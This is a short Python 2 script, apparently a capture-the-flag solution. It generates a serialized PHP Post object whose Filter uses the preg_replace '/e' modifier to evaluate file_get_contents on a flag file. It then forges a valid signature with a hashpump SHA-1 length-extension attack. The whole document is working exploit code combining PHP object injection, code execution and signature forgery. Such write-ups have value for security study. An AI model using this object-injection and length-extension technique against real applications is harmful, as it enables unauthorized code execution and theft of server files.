import subprocess
 
php_script = """
<?php
require_once('steves_list_backup/includes/classes.php');
$filter = new Filter('/^(.*)/e', 'strtoupper(\\\\\\\\1)');
 
$text = "file_get_contents(\'/home/daedalus/flag.txt\',true)";
$text = htmlspecialchars($text);
 
$title = 'title';
$title = htmlspecialchars($title);
 
$post = new Post($title, $text, $filter);
 
$post_ser = serialize($post);
 
$ser = 'b:1;\\n' .  $post_ser;
echo $ser;
?>
"""
 
with open('phpscript.php', 'w') as f:
    f.write(php_script)
 
php_output = subprocess.check_output('php phpscript.php', shell=True, stderr=subprocess.STDOUT).split('<')[0]
print '-' * 10 + " PHP OUTPUT " + '-' * 10
php_output = php_output.replace("'", "'\"'\"'")
print php_output
 
original_hash = '2141b332222df459fd212440824a35e63d37ef69'
original_data = 'b:1;'
appended_data = php_output
key_length = 8
 
print '-' * 10 + " HASHPUMP ARGS " + '-' * 10
print original_hash
print original_data
print appended_data
 
command = "hashpump -s '{}' -d '{}' -a '{}' -k '{}'".format(original_hash,
                                                            original_data,
                                                            appended_data,
                                                            key_length)
 
print '-' * 10 + " HASHPUMP COMMAND " + '-' * 10
print command
output = subprocess.call(command, shell=True)
print '-' * 10 + " HASHPUMP OUTPUT " + '-' * 10
print output
